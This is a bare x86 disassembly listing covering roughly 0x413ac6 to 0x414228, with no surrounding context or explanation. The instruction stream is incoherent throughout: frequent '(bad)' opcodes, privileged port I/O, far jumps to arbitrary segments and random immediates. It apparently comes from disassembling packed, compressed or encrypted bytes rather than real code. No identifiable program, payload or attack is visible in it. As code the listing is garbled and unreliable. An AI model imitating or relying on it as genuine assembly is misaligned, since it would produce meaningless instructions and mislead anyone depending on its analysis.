  413ac6:	mov    esi,0x41bccee1
  413acb:	pop    es
  413acc:	add    DWORD PTR [ebx-0x2e],eax
  413acf:	shr    BYTE PTR [eax-0x59],1
  413ad2:	mov    ecx,DWORD PTR [ebx+eax*8]
  413ad5:	dec    esp
  413ad6:	inc    edi
  413ad7:	or     BYTE PTR [edi+0x12],bh
  413ada:	xchg   ebp,eax
  413adb:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413add:	mov    eax,0xa7c27a7d
  413ae2:	inc    ecx
  413ae3:	ret    0xb086
  413ae6:	icebp  
  413ae7:	xchg   edx,eax
  413ae8:	outs   dx,BYTE PTR ds:[esi]
  413ae9:	mov    ebp,0x8b32ec80
  413aee:	mov    bl,BYTE PTR [esi+0x7bf41740]
  413af4:	jmp    0x413b39
  413af6:	int3   
  413af7:	ja     0x413b42
  413af9:	sub    eax,0x86858d3f
  413afe:	cmp    DWORD PTR [esi+0x75],0xb848556b
  413b05:	mov    ds:0xe2c279df,eax
  413b0a:	mov    ds:0x40827a0c,al
  413b0f:	enter  0xccc7,0xa
  413b13:	in     eax,dx
  413b14:	arpl   WORD PTR [eax-0x30],di
  413b17:	pop    edx
  413b18:	pop    ds
  413b19:	fsub   QWORD PTR [ebx]
  413b1b:	sbb    al,0x61
  413b1d:	into   
  413b1e:	pusha  
  413b1f:	(bad)  
  413b20:	adc    ebx,DWORD PTR [esi-0x2a4a8199]
  413b26:	cmp    BYTE PTR [esi+0x1d],bl
  413b29:	dec    ecx
  413b2a:	(bad)  
  413b2b:	mov    ds:0x83013a1f,eax
  413b30:	xchg   edx,eax
  413b31:	push   edi
  413b32:	loopne 0x413b9a
  413b34:	jg     0x413ae2
  413b36:	out    0x2c,al
  413b38:	xor    ch,BYTE PTR ds:0xfa02746d
  413b3e:	xchg   ebx,eax
  413b3f:	stos   DWORD PTR es:[edi],eax
  413b40:	leave  
  413b41:	inc    ecx
  413b42:	je     0x413b3a
  413b44:	add    DWORD PTR [esp+0x57],edi
  413b48:	test   eax,0x57de1640
  413b4d:	dec    eax
  413b4e:	pop    edi
  413b4f:	push   esi
  413b50:	and    al,0x19
  413b52:	mov    cl,0xef
  413b54:	sahf   
  413b55:	rcl    DWORD PTR [ebx-0x76],0xa9
  413b59:	mov    bl,0x5e
  413b5b:	aad    0x5a
  413b5d:	push   0xe370203b
  413b62:	popa   
  413b63:	pop    edi
  413b64:	out    0x74,al
  413b66:	mul    DWORD PTR [edx+0x3f]
  413b69:	data16 sub ah,BYTE PTR [edi+ebx*4-0x585cc660]
  413b71:	xor    edx,0x594833e
  413b77:	push   esi
  413b78:	jg     0x413b8f
  413b7a:	retf   
  413b7b:	add    cl,BYTE PTR [ecx]
  413b7d:	jne    0x413b19
  413b7f:	cwde   
  413b80:	add    dh,cl
  413b82:	hlt    
  413b83:	jbe    0x413b68
  413b85:	jmp    FWORD PTR [eax+eiz*8+0x8]
  413b89:	nop
  413b8a:	sbb    BYTE PTR [edx+0x6ff6cb79],ch
  413b90:	lods   al,BYTE PTR ds:[esi]
  413b91:	or     ecx,DWORD PTR [ebx-0x64cd64c1]
  413b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b98:	sbb    BYTE PTR [esi+0x1c],bh
  413b9b:	stos   DWORD PTR es:[edi],eax
  413b9c:	in     al,0xfb
  413b9e:	pusha  
  413b9f:	imul   esi,DWORD PTR [edi],0x56a7a7e3
  413ba5:	xor    DWORD PTR [edi],esi
  413ba7:	push   cs
  413ba8:	nop
  413ba9:	jb     0x413c0a
  413bab:	mov    DWORD PTR [eax],esi
  413bad:	clc    
  413bae:	add    edi,edx
  413bb0:	inc    esp
  413bb1:	inc    esp
  413bb2:	daa    
  413bb3:	push   esp
  413bb4:	add    BYTE PTR [esi+0x60],bl
  413bb7:	daa    
  413bb8:	ror    DWORD PTR [edx+0x34],1
  413bbb:	xlat   BYTE PTR ds:[ebx]
  413bbc:	add    DWORD PTR [ebp-0x75308a5f],ecx
  413bc2:	bound  ebp,QWORD PTR [ecx+ecx*8]
  413bc5:	push   edx
  413bc6:	push   esp
  413bc7:	push   es
  413bc8:	cmp    dl,0xfa
  413bcb:	jns    0x413bf7
  413bcd:	add    esp,DWORD PTR [ebx+edi*1-0x41]
  413bd1:	loopne 0x413b96
  413bd3:	and    edx,DWORD PTR [ecx-0x30b75b85]
  413bd9:	add    eax,0x83725287
  413bde:	imul   eax,DWORD PTR [ecx-0x41],0xcda8ab57
  413be5:	cmp    DWORD PTR [edx-0x68],edi
  413be8:	push   esp
  413be9:	rol    BYTE PTR [ebx+eax*4-0x72b6a043],1
  413bf0:	or     DWORD PTR [eax-0x36],edx
  413bf3:	mov    ebx,0xe8d0160
  413bf8:	xchg   edi,eax
  413bf9:	push   0xfffffff5
  413bfb:	adc    BYTE PTR [esi+0x1c7f381a],ch
  413c01:	cwde   
  413c02:	pop    edx
  413c03:	pop    esp
  413c04:	(bad)  
  413c05:	cmp    eax,0x1c5899ab
  413c0a:	(bad)  
  413c0b:	fiadd  WORD PTR [eax+edx*4]
  413c0e:	aaa    
  413c0f:	xor    edi,DWORD PTR [edi]
  413c11:	in     eax,0x9b
  413c13:	jl     0x413bb5
  413c15:	sub    eax,0x54e10556
  413c1a:	mov    cl,0xa0
  413c1c:	dec    edx
  413c1d:	xchg   esp,eax
  413c1e:	xor    dh,bl
  413c20:	out    0xb4,eax
  413c22:	mov    es,edi
  413c24:	pop    ebx
  413c25:	mov    esi,0xcac45848
  413c2a:	pop    ebp
  413c2b:	cwde   
  413c2c:	jo     0x413c49
  413c2e:	(bad)  
  413c2f:	sub    ebx,DWORD PTR [ebp+0x2ec70a35]
  413c35:	cmp    al,0xd3
  413c37:	inc    ecx
  413c38:	pop    esi
  413c39:	sbb    al,0x3b
  413c3b:	xchg   esi,eax
  413c3c:	test   al,0x9e
  413c3e:	out    0x8f,al
  413c40:	sbb    edx,edi
  413c42:	jmp    0x413c6d
  413c44:	cmp    eax,DWORD PTR [esi+esi*2-0x2b]
  413c48:	jbe    0x413c78
  413c4a:	push   es
  413c4b:	and    al,0x5d
  413c4d:	jae    0x413be2
  413c4f:	or     edx,esp
  413c51:	stc    
  413c52:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413c54:	adc    DWORD PTR [esi+0x3f751de8],ebp
  413c5a:	mov    WORD PTR [edx+esi*2],cs
  413c5d:	cld    
  413c5e:	leave  
  413c5f:	jecxz  0x413c7a
  413c61:	call   0xbf62:0x20e65a20
  413c68:	and    bl,BYTE PTR [ebx+0x652e21cc]
  413c6e:	loopne 0x413c76
  413c70:	iret   
  413c71:	std    
  413c72:	fsubrp st(4),st
  413c74:	iret   
  413c75:	jo     0x413c66
  413c77:	fsubp  st(2),st
  413c79:	mov    ds:0xc0414e10,al
  413c7e:	inc    eax
  413c7f:	inc    DWORD PTR [ebp+0x1bace680]
  413c85:	sbb    BYTE PTR [ecx-0x5985af1d],ch
  413c8b:	and    BYTE PTR [ebx],ch
  413c8d:	xchg   esp,eax
  413c8e:	mov    edx,0x7b469b69
  413c93:	dec    ebx
  413c94:	test   al,0xfd
  413c96:	jns    0x413cbc
  413c98:	xor    BYTE PTR [ebx-0x42],bh
  413c9b:	xor    dl,BYTE PTR [ebx-0x55985fe1]
  413ca1:	xchg   esp,eax
  413ca2:	inc    ebx
  413ca3:	hlt    
  413ca4:	lds    eax,FWORD PTR [eax+0x11]
  413ca7:	daa    
  413ca8:	sub    BYTE PTR [edx-0x67cf5384],0xed
  413caf:	cs jnp 0x413c57
  413cb2:	sbb    bl,BYTE PTR [edx]
  413cb4:	retf   0xa211
  413cb7:	enter  0x529a,0x3f
  413cbb:	mov    esi,0x2fbe804c
  413cc0:	aam    0x67
  413cc2:	sub    al,0xbe
  413cc4:	sub    esp,DWORD PTR ds:0x45366df0
  413cca:	test   BYTE PTR [ebx+0x56bc48d],ch
  413cd0:	mov    edx,0x9e2c472f
  413cd5:	and    al,0xb7
  413cd7:	fimul  DWORD PTR [ebx-0x58]
  413cda:	outs   dx,BYTE PTR ds:[esi]
  413cdb:	and    eax,0x9f32b1b0
  413ce0:	mov    bl,0x5d
  413ce2:	push   es
  413ce3:	in     eax,0x92
  413ce5:	ds stos BYTE PTR es:[edi],al
  413ce7:	mov    esi,0x5187e31e
  413cec:	sbb    eax,0xe416baa0
  413cf1:	ins    BYTE PTR es:[edi],dx
  413cf2:	outs   dx,BYTE PTR ds:[esi]
  413cf3:	xor    cl,BYTE PTR [ebx-0x1b29057]
  413cf9:	cmp    dh,0xb9
  413cfc:	(bad)  
  413cfd:	jle    0x413d70
  413cff:	fs xchg ecx,eax
  413d01:	jmp    0x413cba
  413d03:	(bad)  
  413d04:	jo     0x413cb8
  413d06:	ds (bad) 
  413d08:	sbb    bh,ah
  413d0a:	jne    0x413d1f
  413d0c:	xor    DWORD PTR [edi-0x25307f90],eax
  413d12:	nop
  413d13:	scas   eax,DWORD PTR es:[edi]
  413d14:	push   es
  413d15:	retf   
  413d16:	das    
  413d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d18:	sti    
  413d19:	fwait
  413d1a:	aam    0xf7
  413d1c:	cli    
  413d1d:	stos   DWORD PTR es:[edi],eax
  413d1e:	fidivr DWORD PTR [esp+eiz*8]
  413d21:	rcr    dl,cl
  413d23:	popa   
  413d24:	pop    edi
  413d25:	or     DWORD PTR [ebp-0x552acdef],ebx
  413d2b:	cmp    al,0xd8
  413d2d:	iret   
  413d2e:	(bad)  
  413d2f:	jge    0x413d1d
  413d31:	std    
  413d32:	jb     0x413d9c
  413d34:	mov    fs,WORD PTR [ecx+edi*8+0x1657c680]
  413d3b:	jb     0x413d46
  413d3d:	xchg   ebx,eax
  413d3e:	retf   0xfae3
  413d41:	rol    BYTE PTR [ecx+0x42c2fd10],cl
  413d47:	inc    edx
  413d48:	mov    edi,DWORD PTR [esi-0x55095227]
  413d4e:	cmp    BYTE PTR [eax+0x59],cl
  413d51:	pop    esi
  413d52:	mov    esp,0xa33abea
  413d57:	jbe    0x413d5a
  413d59:	xchg   DWORD PTR [ecx],ebp
  413d5b:	outs   dx,BYTE PTR ds:[esi]
  413d5c:	mov    bl,0xbf
  413d5e:	scas   eax,DWORD PTR es:[edi]
  413d5f:	je     0x413ce1
  413d61:	or     eax,0x95704835
  413d66:	jecxz  0x413d73
  413d68:	in     eax,dx
  413d69:	bound  ebx,QWORD PTR [edx-0x2adc1ab4]
  413d6f:	lods   al,BYTE PTR ds:[esi]
  413d70:	xchg   ecx,eax
  413d71:	xor    ebp,DWORD PTR [ebx]
  413d73:	fs fs leave 
  413d76:	cmp    al,BYTE PTR [ecx+0x292741cb]
  413d7c:	pop    edi
  413d7d:	add    BYTE PTR [ecx-0x793386e],cl
  413d83:	es fstp st(1)
  413d86:	sub    cl,BYTE PTR ds:0x6ff7e2c0
  413d8c:	mov    al,0x71
  413d8e:	dec    edx
  413d8f:	in     eax,0x66
  413d91:	ins    DWORD PTR es:[edi],dx
  413d92:	adc    al,0xb4
  413d94:	icebp  
  413d95:	out    0x28,eax
  413d97:	inc    edi
  413d98:	or     BYTE PTR [esi-0x4c3e19ac],cl
  413d9e:	lods   al,BYTE PTR ds:[esi]
  413d9f:	adc    DWORD PTR [eax],eax
  413da1:	lods   al,BYTE PTR ds:[esi]
  413da2:	repz add dl,dl
  413da5:	push   esp
  413da6:	add    eax,eax
  413da8:	push   ebx
  413da9:	je     0x413d34
  413dab:	push   ebp
  413dac:	cli    
  413dad:	ss mov al,0xea
  413db0:	call   DWORD PTR [ebx+0x10]
  413db3:	mov    BYTE PTR [edx-0x2a448e5a],dl
  413db9:	and    BYTE PTR [esi],bh
  413dbb:	neg    BYTE PTR [ebx]
  413dbd:	sub    ebp,ebp
  413dbf:	pop    esi
  413dc0:	jg     0x413d4f
  413dc2:	mov    cl,0xab
  413dc4:	(bad)  
  413dc5:	xchg   ecx,eax
  413dc6:	mov    edi,0x953ece79
  413dcb:	nop
  413dcc:	jle    0x413de5
  413dce:	xchg   ebx,eax
  413dcf:	cdq    
  413dd0:	xacquire xchg DWORD PTR [ebx],esp
  413dd3:	sbb    eax,0x2b352c50
  413dd8:	outs   dx,DWORD PTR ds:[esi]
  413dd9:	mov    eax,gs:0x755cf1b8
  413ddf:	mov    ah,0xd0
  413de1:	outs   dx,DWORD PTR ds:[esi]
  413de2:	fnstenv [eax-0x1133bbad]
  413de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de9:	jns    0x413d8d
  413deb:	nop
  413dec:	xor    eax,0xd0622c48
  413df1:	sbb    cl,bh
  413df3:	or     ah,BYTE PTR [ecx-0x19]
  413df6:	or     BYTE PTR [eax-0xd],dh
  413df9:	lods   eax,DWORD PTR fs:[esi]
  413dfb:	in     eax,dx
  413dfc:	and    DWORD PTR cs:0x84e40fc7,ebx
  413e03:	(bad)  
  413e04:	popa   
  413e05:	adc    eax,0xc7be9c00
  413e0a:	out    0xe8,eax
  413e0c:	in     al,dx
  413e0d:	into   
  413e0e:	mov    al,ds:0x31a91cd0
  413e13:	xchg   ecx,eax
  413e14:	das    
  413e15:	fisub  DWORD PTR [eax]
  413e17:	push   esp
  413e18:	in     eax,dx
  413e19:	add    edx,ebp
  413e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e1c:	aas    
  413e1d:	jecxz  0x413de7
  413e1f:	outs   dx,DWORD PTR ds:[esi]
  413e20:	and    esp,DWORD PTR [ebp+0x3e1ba777]
  413e26:	or     esp,ebx
  413e28:	mov    DWORD PTR [esi],esi
  413e2a:	cmp    edi,DWORD PTR [edi+0x4f1f9d2d]
  413e30:	sub    DWORD PTR [si-0x2798],esp
  413e35:	sbb    al,0x82
  413e37:	sti    
  413e38:	inc    ecx
  413e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e3a:	ss cld 
  413e3c:	popf   
  413e3d:	sbb    DWORD PTR [ebx],0x3f
  413e40:	inc    ebp
  413e41:	popa   
  413e42:	adc    BYTE PTR [ebx],al
  413e44:	icebp  
  413e45:	pop    es
  413e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e47:	xchg   DWORD PTR [ebx-0x6c2eeff8],esi
  413e4d:	nop
  413e4e:	popa   
  413e4f:	(bad)  
  413e50:	loop   0x413de8
  413e52:	jle    0x413e25
  413e54:	repz xchg ecx,eax
  413e56:	stos   DWORD PTR es:[edi],eax
  413e57:	mov    ah,0x71
  413e59:	xchg   ebp,eax
  413e5a:	retf   
  413e5b:	aad    0x6d
  413e5d:	(bad)  
  413e5e:	adc    eax,0xccab7250
  413e63:	ins    DWORD PTR es:[edi],dx
  413e64:	cmc    
  413e65:	adc    eax,0xc3a0b0da
  413e6a:	outs   dx,DWORD PTR ds:[esi]
  413e6b:	push   eax
  413e6c:	jnp    0x413ee2
  413e6e:	cmp    BYTE PTR [esi-0x5c3b0688],bh
  413e74:	mov    dl,0x44
  413e76:	icebp  
  413e77:	or     dh,BYTE PTR [esi+0x31]
  413e7a:	std    
  413e7b:	sti    
  413e7c:	lods   eax,DWORD PTR ds:[esi]
  413e7d:	sbb    eax,0xebac8d41
  413e82:	pushf  
  413e83:	rep outs dx,BYTE PTR ds:[esi]
  413e85:	jne    0x413ef3
  413e87:	nop
  413e88:	call   0x177e:0xf979bf4f
  413e8f:	xchg   esp,eax
  413e90:	lock sub BYTE PTR [ebp+edi*2-0x2b0c20a2],cl
  413e98:	xor    bh,BYTE PTR [edx-0x70df64d7]
  413e9e:	dec    esi
  413e9f:	scas   eax,DWORD PTR es:[edi]
  413ea0:	adc    eax,DWORD PTR fs:[ebx+0x22]
  413ea4:	jecxz  0x413f04
  413ea6:	xor    DWORD PTR [esp+eax*8],ecx
  413ea9:	pop    edi
  413eaa:	rcl    DWORD PTR [esi],1
  413eac:	and    eax,0xcd22f834
  413eb1:	popa   
  413eb2:	xor    al,0x66
  413eb4:	shr    BYTE PTR [edx+0x6d],1
  413eb7:	or     esp,DWORD PTR [edi-0x4ac6fb4c]
  413ebd:	mov    WORD PTR [esi],gs
  413ebf:	cmp    al,0xee
  413ec1:	je     0x413ebc
  413ec3:	mov    eax,ds:0xde1b3e00
  413ec8:	ret    0xb697
  413ecb:	mov    cl,0xa7
  413ecd:	daa    
  413ece:	stos   DWORD PTR es:[edi],eax
  413ecf:	dec    edi
  413ed0:	push   es
  413ed1:	adc    DWORD PTR [esi+ecx*4],esi
  413ed4:	(bad)  
  413ed5:	int3   
  413ed6:	test   al,0x5c
  413ed8:	cmp    DWORD PTR [esi+0x53183cc5],edx
  413ede:	outs   dx,DWORD PTR ds:[esi]
  413edf:	test   DWORD PTR [edx+0x286687f8],ebp
  413ee5:	lea    esi,[edx+0x234e8793]
  413eeb:	inc    edi
  413eec:	push   edi
  413eed:	push   ebp
  413eee:	repnz xchg edx,eax
  413ef0:	mov    BYTE PTR [eax-0x2b817eae],ah
  413ef6:	mov    bl,dl
  413ef8:	outs   dx,DWORD PTR ds:[esi]
  413ef9:	stc    
  413efa:	pushf  
  413efb:	xchg   ebp,eax
  413efc:	addr16 mov esi,0xc9090304
  413f02:	fist   WORD PTR [edx]
  413f04:	scas   al,BYTE PTR es:[edi]
  413f05:	push   ds
  413f06:	or     eax,0xb14274de
  413f0b:	retf   
  413f0c:	test   BYTE PTR [edx],dh
  413f0e:	lahf   
  413f0f:	int    0x8c
  413f11:	into   
  413f12:	outs   dx,BYTE PTR ds:[esi]
  413f13:	inc    edx
  413f14:	mov    al,ds:0x40fa73d
  413f19:	jb     0x413ecb
  413f1b:	and    edx,DWORD PTR [edx+0x7ce2bee4]
  413f21:	cld    
  413f22:	aad    0x23
  413f24:	dec    edx
  413f25:	sbb    eax,0xc5ba07a2
  413f2a:	mov    bl,dl
  413f2c:	jecxz  0x413ebd
  413f2e:	jge    0x413f6e
  413f30:	rcl    BYTE PTR [edi+0x32ed25fd],cl
  413f36:	aaa    
  413f37:	mov    cl,0x7e
  413f39:	mov    ebx,ds
  413f3b:	test   BYTE PTR [edi],al
  413f3d:	out    dx,al
  413f3e:	jge    0x413fbe
  413f40:	lds    edi,FWORD PTR ds:[edi]
  413f43:	jl     0x413f05
  413f45:	fldlg2 
  413f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f48:	and    bh,dl
  413f4a:	push   eax
  413f4b:	es test eax,0x25217fbb
  413f51:	je     0x413fa8
  413f53:	sbb    ebp,esi
  413f55:	add    DWORD PTR [eax],edi
  413f57:	paddusb mm7,QWORD PTR [edi+0x28]
  413f5b:	mov    bh,0x20
  413f5d:	lea    edx,[ecx]
  413f5f:	push   es
  413f60:	outs   dx,DWORD PTR ds:[esi]
  413f61:	jmp    0x2d86:0xc1405c15
  413f68:	cmp    BYTE PTR [ebx-0x65],ch
  413f6b:	fwait
  413f6c:	iret   
  413f6d:	or     esp,DWORD PTR [esi]
  413f6f:	adc    eax,0x36bcf71e
  413f74:	sub    ebx,DWORD PTR fs:[ebp+0x19d2555f]
  413f7b:	jmp    0x16484e1b
  413f80:	add    al,dh
  413f82:	(bad)  
  413f83:	mov    eax,0xca205aef
  413f88:	dec    edx
  413f89:	call   FWORD PTR [ebx-0x33]
  413f8c:	dec    ebp
  413f8d:	ins    DWORD PTR es:[edi],dx
  413f8e:	je     0x413fcc
  413f90:	retf   
  413f91:	adc    eax,0x456bf64e
  413f96:	xor    DWORD PTR [ebx],ecx
  413f98:	cmp    DWORD PTR [ebx-0x2c],edx
  413f9b:	xchg   edi,eax
  413f9c:	fs push eax
  413f9e:	rcr    DWORD PTR [ebx-0x29e3f8f1],1
  413fa4:	jge    0x413f66
  413fa6:	or     dl,BYTE PTR [ebx]
  413fa8:	pop    ebp
  413fa9:	xor    al,0x8a
  413fab:	and    BYTE PTR [ebp+0x4587fe72],dl
  413fb1:	int3   
  413fb2:	push   ecx
  413fb3:	pop    ecx
  413fb4:	(bad)  
  413fb5:	aam    0x30
  413fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fb8:	call   0x5829:0x41167e98
  413fbf:	sbb    eax,0xc41310d3
  413fc4:	imul   esp,DWORD PTR [edx+0x16],0x429f1f9
  413fcb:	int3   
  413fcc:	sar    cl,cl
  413fce:	out    dx,al
  413fcf:	out    dx,eax
  413fd0:	lods   al,BYTE PTR ds:[esi]
  413fd1:	xor    cl,BYTE PTR [ecx+0x36]
  413fd4:	cld    
  413fd5:	xlat   BYTE PTR ds:[ebx]
  413fd6:	adc    al,0x2f
  413fd8:	bound  esi,QWORD PTR [eax+0x49]
  413fdb:	pop    ebp
  413fdc:	(bad)  
  413fdd:	sub    eax,0x5ccdf3aa
  413fe2:	shr    edi,cl
  413fe4:	lds    eax,FWORD PTR [ecx]
  413fe6:	mov    bh,0x4e
  413fe8:	xlat   BYTE PTR ds:[ebx]
  413fe9:	mov    ah,ch
  413feb:	jmp    0x7ef691d7
  413ff0:	cwde   
  413ff1:	in     al,0xe0
  413ff3:	pop    es
  413ff4:	daa    
  413ff5:	adc    BYTE PTR [edi+0x4193901c],dl
  413ffb:	je     0x41403e
  413ffd:	mov    esp,0x57bacaf5
  414002:	xlat   BYTE PTR ds:[ebx]
  414003:	inc    esi
  414004:	xchg   esi,eax
  414005:	lds    esp,FWORD PTR [ecx+0x7c]
  414008:	jle    0x413f8e
  41400a:	inc    ebp
  41400b:	mov    dl,0xd6
  41400d:	popf   
  41400e:	xor    DWORD PTR [ebx],0xffffffd8
  414011:	or     al,BYTE PTR [edi-0x67]
  414014:	jns    0x413fcd
  414016:	fidiv  DWORD PTR [ecx-0x31db326d]
  41401c:	mov    esp,0x78250094
  414021:	pop    eax
  414022:	mov    dl,0x96
  414024:	jns    0x41406a
  414026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414027:	jns    0x41402f
  414029:	mov    ds:0xec5f3d80,al
  41402e:	outs   dx,DWORD PTR ds:[esi]
  41402f:	push   ss
  414030:	jne    0x414056
  414032:	in     eax,0x4d
  414034:	sti    
  414035:	jmp    0x7e831d4
  41403a:	scas   al,BYTE PTR es:[edi]
  41403b:	and    bl,BYTE PTR [edx+0x3c]
  41403e:	fstp   TBYTE PTR [ebx]
  414040:	cmp    al,0x9e
  414042:	addr16 pop edx
  414044:	and    al,BYTE PTR gs:[ebp+0x2f269c6f]
  41404b:	scas   eax,DWORD PTR es:[edi]
  41404c:	mov    bl,0x73
  41404e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41404f:	int3   
  414050:	push   0xffffffdf
  414052:	xchg   edi,eax
  414053:	cmp    BYTE PTR [eax-0xf3998bb],dl
  414059:	ins    BYTE PTR es:[edi],dx
  41405a:	repnz mov ss,WORD PTR [ecx]
  41405d:	dec    esp
  41405e:	push   ecx
  41405f:	jne    0x4140a8
  414061:	in     eax,0x9a
  414063:	inc    esp
  414064:	aaa    
  414065:	nop
  414066:	or     bh,al
  414068:	mov    al,0x1e
  41406a:	pusha  
  41406b:	mov    ebx,0x83f17d93
  414070:	mov    ebx,0x3b9614ed
  414075:	aas    
  414076:	fdiv   QWORD PTR [ebx+0xf]
  414079:	addps  xmm0,XMMWORD PTR [esi+0x37f88464]
  414080:	outs   dx,DWORD PTR ds:[esi]
  414081:	and    bl,BYTE PTR [esi+0xc646794]
  414087:	cli    
  414088:	pop    ss
  414089:	sub    eax,0xf09c3af9
  41408e:	mov    al,ds:0x4ea5c3d3
  414093:	mov    ah,0xd9
  414095:	pushf  
  414096:	sub    BYTE PTR ds:0x839a3879,dl
  41409c:	test   BYTE PTR [edi+0x13],dh
  41409f:	mov    ss,WORD PTR [edx]
  4140a1:	jmp    0xfd56:0x2c4f84c4
  4140a8:	les    eax,FWORD PTR [ecx+0x7e]
  4140ab:	push   ecx
  4140ac:	cmc    
  4140ad:	xchg   edi,eax
  4140ae:	out    0x79,eax
  4140b0:	dec    DWORD PTR [edx+0x2f5735c3]
  4140b6:	add    ah,BYTE PTR [ebx+0x378b6323]
  4140bc:	adc    DWORD PTR [ecx-0x422979f2],edx
  4140c2:	fwait
  4140c3:	iret   
  4140c4:	cmp    DWORD PTR [edx],edx
  4140c6:	xchg   edx,eax
  4140c7:	cmp    ecx,ebx
  4140c9:	imul   ecx,DWORD PTR [eax],0x6
  4140cc:	or     BYTE PTR [ebx-0x73],ah
  4140cf:	shr    DWORD PTR [edi-0x5a7c8dd2],cl
  4140d5:	ss ja  0x414126
  4140d8:	and    esi,ebp
  4140da:	repnz test edx,ecx
  4140dd:	std    
  4140de:	mov    fs,WORD PTR [ecx-0x30e66771]
  4140e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140e5:	sbb    ecx,edi
  4140e7:	inc    esi
  4140e8:	xchg   edi,eax
  4140e9:	fwait
  4140ea:	(bad)  
  4140eb:	or     eax,0x1dd2ab97
  4140f0:	dec    ebp
  4140f1:	cmp    BYTE PTR [esi+0x719b8f54],ch
  4140f7:	(bad)  
  4140f8:	in     eax,0x9f
  4140fa:	push   ebp
  4140fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140fc:	push   esi
  4140fd:	and    bh,BYTE PTR [edx+ebx*4-0xcbe77f3]
  414104:	adc    eax,0x9c2c182d
  414109:	outs   dx,BYTE PTR ds:[esi]
  41410a:	xor    eax,ebp
  41410c:	(bad)  
  41410d:	imul   edi,ecx,0xffffff9a
  414110:	xchg   edx,eax
  414111:	jnp    0x414116
  414113:	mov    esi,DWORD PTR [ebp+0x4f8017b9]
  414119:	pushf  
  41411a:	sbb    DWORD PTR [esi-0xa],edx
  41411d:	xchg   esp,eax
  41411e:	xchg   edx,eax
  41411f:	xlat   BYTE PTR ds:[ebx]
  414120:	push   0x58c0b8f
  414125:	jno    0x41415b
  414127:	retf   
  414128:	sbb    BYTE PTR [edx],bh
  41412a:	std    
  41412b:	les    esi,FWORD PTR [ebx-0x57]
  41412e:	cwde   
  41412f:	and    ecx,DWORD PTR [ebp+eiz*8-0x7a]
  414133:	jp     0x414159
  414135:	pop    esi
  414136:	inc    edi
  414137:	cmp    esi,DWORD PTR [ecx]
  414139:	scas   al,BYTE PTR es:[edi]
  41413a:	dec    edi
  41413b:	sub    DWORD PTR [eax],edx
  41413d:	ret    0x7c3e
  414140:	mov    eax,DWORD PTR [edx-0x1dcca8e3]
  414146:	sbb    ah,dh
  414148:	xchg   edx,eax
  414149:	adc    bl,al
  41414b:	into   
  41414c:	lods   eax,DWORD PTR ds:[esi]
  41414e:	sbb    DWORD PTR [eax-0x1c],eax
  414151:	jp     0x4141a2
  414153:	sbb    cl,BYTE PTR [ebp+eiz*8+0x69]
  414157:	and    al,BYTE PTR [edi+0x617644e9]
  41415d:	mov    DWORD PTR [ecx+0x68],esi
  414160:	fbstp  TBYTE PTR [ebp-0x62f52d34]
  414166:	ds daa 
  414168:	dec    esi
  414169:	sbb    al,0xca
  41416b:	add    edi,ebp
  41416d:	cmp    edi,DWORD PTR [edx-0x2cc03f7f]
  414173:	dec    ebx
  414174:	mov    bh,0x63
  414176:	dec    esi
  414177:	xchg   edx,eax
  414179:	push   cs
  41417a:	adc    eax,0x61d0f0ab
  41417f:	mov    BYTE PTR [esi+0x42c925cb],dl
  414185:	adc    al,0xb5
  414187:	aam    0xf4
  414189:	repz fwait
  41418b:	sub    eax,0x3a1f7b22
  414190:	aam    0x93
  414192:	push   ebp
  414193:	lea    ebp,[eax+edi*2-0x7c182fd2]
  41419a:	jecxz  0x414162
  41419c:	pop    edx
  41419d:	xchg   ecx,eax
  41419e:	sbb    eax,0xdc1f38e8
  4141a3:	push   edi
  4141a4:	in     eax,0x34
  4141a6:	pop    ebx
  4141a7:	sub    DWORD PTR [esi-0x686ddcb4],esi
  4141ad:	out    0xda,al
  4141af:	push   es
  4141b0:	shl    DWORD PTR [edi-0x149fa989],1
  4141b6:	rcr    DWORD PTR [eax+0x74],0x8d
  4141ba:	mov    esp,0x82775913
  4141bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141c0:	out    0xea,eax
  4141c2:	dec    edi
  4141c3:	retf   
  4141c4:	xchg   edx,eax
  4141c5:	xchg   esp,eax
  4141c6:	test   DWORD PTR [edi],eax
  4141c8:	shr    BYTE PTR [ebp+0x73ae6df],0x37
  4141cf:	cmp    BYTE PTR [edx+0x33ef8e90],0x95
  4141d6:	lds    edx,FWORD PTR [eax+0x5]
  4141d9:	mov    eax,ds:0xe0fd4bb
  4141de:	dec    esi
  4141df:	and    BYTE PTR [ebx-0x5e95f2e6],bh
  4141e5:	mov    gs,WORD PTR [ebp+eiz*4+0x68]
  4141e9:	xchg   ebx,eax
  4141ea:	fwait
  4141eb:	cmp    dl,bh
  4141ed:	mov    al,0xdf
  4141ef:	or     al,0xe5
  4141f1:	jl     0x414266
  4141f3:	xchg   esp,eax
  4141f4:	aad    0xd5
  4141f6:	popa   
  4141f7:	push   edi
  4141f8:	mov    dh,0x93
  4141fa:	div    DWORD PTR [esp+ecx*2]
  4141fd:	or     DWORD PTR es:[eax+0x7d],esp
  414201:	mov    esi,0x5e957758
  414206:	fadd   DWORD PTR [ebp-0x71]
  414209:	cwde   
  41420a:	leave  
  41420b:	jecxz  0x41423d
  41420d:	lds    esp,FWORD PTR [ecx]
  41420f:	fcomp  DWORD PTR [eax-0x5a49f3d7]
  414215:	pop    ebp
  414216:	pop    ebx
  414217:	inc    esi
  414218:	int    0xb0
  41421a:	leave  
  41421b:	gs xor al,0x5c
  41421e:	dec    edx
  41421f:	inc    ebx
  414220:	shl    ebx,0xbc
  414223:	outs   dx,DWORD PTR ds:[esi]
  414224:	repz in eax,0x38
  414227:	(bad)  
  414228:	jle    0x414242
